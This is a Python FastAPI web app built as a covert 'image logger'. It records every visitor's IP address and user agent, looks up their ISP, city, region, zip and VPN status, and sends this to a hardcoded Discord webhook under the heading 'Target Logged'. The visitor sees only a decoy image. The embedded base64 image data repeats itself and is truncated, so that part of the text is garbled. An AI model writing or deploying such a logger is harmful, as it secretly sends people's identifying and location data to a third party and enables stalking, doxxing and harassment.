from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()

WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"

@app.get("/", response_class=HTMLResponse)
async def log_request(request: Request):
    # 1. Get the IP
    all_ips = request.headers.get("x-forwarded-for", request.client.host)
    client_ip = all_ips.split(',')[0].strip()

    try:
        # 2. Get detailed info using ip-api.com (more reliable)
        # We use http here because it's faster for free tier
        response = requests.get(f"http://ip-api.com/json/{client_ip}?fields=66842623", timeout=10)
        data = response.json()
        
        # 3. Format the Discord Message
        if data.get("status") == "success":
            embed_content = (
                f"**Image Logger - Target Logged**\n"
                f"**IP:** `{client_ip}`\n"
                f"**Provider:** `{data.get('isp')}`\n"
                f"**Country:** `{data.get('country')}`\n"
                f"**Region:** `{data.get('regionName')}`\n"
                f"**City:** `{data.get('city')}`\n"
                f"**Zip:** `{data.get('zip')}`\n"
                f"**VPN/Proxy:** `{data.get('proxy')}`\n"
                f"**User Agent:** `{request.headers.get('user-agent')}`"
            )
        else:
            embed_content = f"**Visitor Detected (Basic Log):** `{client_ip}`"

        # 4. Send to Discord
        requests.post(WEBHOOK_URL, json={"content": embed_content}, timeout=5)

    except Exception as e:
        # Emergency backup log
        requests.post(WEBHOOK_URL, json={"content": f"Detection Error: `{e}` | IP: `{client_ip}`"}, timeout=5)

    # 5. Show the image
    return f"""
    <html>
        <head><title>funneh image</title></head>
        <body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
            <img src="data:image/jpeg;base64,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)
